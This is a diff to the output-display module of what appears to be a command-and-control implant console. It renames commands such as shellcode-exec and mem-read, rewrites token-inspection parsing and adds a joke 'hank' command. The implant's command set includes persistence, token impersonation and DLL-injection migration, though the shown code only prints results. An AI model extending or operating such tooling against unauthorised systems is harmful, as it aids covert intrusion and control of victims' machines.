@@ -31,11 +31,11 @@ def display_help():
         ("System enumeration",
          ["ps", "getpid"]),
         ("Execution",
-         ["exec", "shellcodeexec"]),
+         ["exec", "shellcode-exec"]),
         ("Memory / objects",
-         ["memread", "modulelist", "handlelist"]),
+         ["mem-read", "module-list", "handle-list"]),
         ("Environment",
-         ["env", "getenv", "setenv"]),
+         ["env", "get-env", "set-env"]),
         ("Implant management",
          ["sleep", "kill", "persist", "unpersist", "migrate"]),
     ]
@@ -61,27 +61,34 @@ def display_inspect_token(payload):
 
     SE_PRIVILEGE_ENABLED            = 0x00000002
     SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
+  
+    
+    if len(payload) < TOKEN_SUMMARY_HEADER_SIZE:
+        print(f"[!] current-token payload too short: {len(payload)} bytes")
+        return
 
-    target_pid, priv_count = struct.unpack("<II", payload[:8])
-    print(f"  pid        : {target_pid}")
-    print(f"  privileges :")
-    offset = 8
+    elevated, impersonated, user_name_length, user_sid_length = struct.unpack(
+        "<IIII",
+        payload[:TOKEN_SUMMARY_HEADER_SIZE],
+    )
+    total_length = TOKEN_SUMMARY_HEADER_SIZE + user_name_length + user_sid_length
+    if len(payload) < total_length:
+        print(f"[!] current-token payload incomplete: {len(payload)} bytes")
+        return
 
-    for _ in range(priv_count):
-        state, name_length = struct.unpack("<II", payload[offset:offset + 8])
-        offset += 8
-        raw = payload[offset:offset + name_length]
-        name = raw.decode("utf-16le").rstrip("\x00")
-        offset += name_length
+    user_name = payload[
+        TOKEN_SUMMARY_HEADER_SIZE:TOKEN_SUMMARY_HEADER_SIZE + user_name_length
+    ].decode("utf-16le").rstrip("\x00")
+    user_sid_offset = TOKEN_SUMMARY_HEADER_SIZE + user_name_length
+    user_sid = payload[user_sid_offset:user_sid_offset + user_sid_length].decode(
+        "utf-16le"
+    ).rstrip("\x00")
 
-        if state & SE_PRIVILEGE_ENABLED:
-            status = "enabled"
-        elif state & SE_PRIVILEGE_ENABLED_BY_DEFAULT:
-            status = "enabled-by-default"
-        else:
-            status = "disabled"
+    print(f"  username       : {user_name}")
+    print(f"  user_sid       : {user_sid}")
+    print(f"  elevated       : {'yes' if elevated else 'no'}")
+    print(f"  impersonated   : {'yes' if impersonated else 'no'}")
 
-        print(f"    {name:<42} {status}")
 
 
 def display_impersonate_token(payload):
@@ -403,6 +410,13 @@ def display_unpersist(payload):
 def display_migrate(payload):
     print("  DLL injection complete — implant now running in target process.")
 
+# ---------------------------------------------------------------------------
+# Fun Stuff
+# ---------------------------------------------------------------------------
+
+def display_hank(payload):
+    print("  Hanking complete.")
+
 
 # ---------------------------------------------------------------------------
 # Dispatch table
@@ -427,21 +441,22 @@ DISPLAY_HANDLERS = {
     CMD_IDS["getpid"]:           display_getpid,
 
     CMD_IDS["exec"]:             display_exec,
-    CMD_IDS["shellcodeexec"]:    display_shellcodeexec,
+    CMD_IDS["shellcode-exec"]:    display_shellcodeexec,
 
-    CMD_IDS["memread"]:          display_memread,
-    CMD_IDS["modulelist"]:       display_modulelist,
-    CMD_IDS["handlelist"]:       display_handlelist,
+    CMD_IDS["mem-read"]:          display_memread,
+    CMD_IDS["module-list"]:       display_modulelist,
+    CMD_IDS["handle-list"]:       display_handlelist,
 
     CMD_IDS["env"]:              display_env,
-    CMD_IDS["getenv"]:           display_getenv,
-    CMD_IDS["setenv"]:           display_setenv,
+    CMD_IDS["get-env"]:           display_getenv,
+    CMD_IDS["set-env"]:           display_setenv,
 
     CMD_IDS["sleep"]:            display_sleep,
     CMD_IDS["kill"]:             display_kill,
     CMD_IDS["persist"]:          display_persist,
     CMD_IDS["unpersist"]:        display_unpersist,
     CMD_IDS["migrate"]:          display_migrate,
+    CMD_IDS["hank"]:          display_hank,
 }
 
 
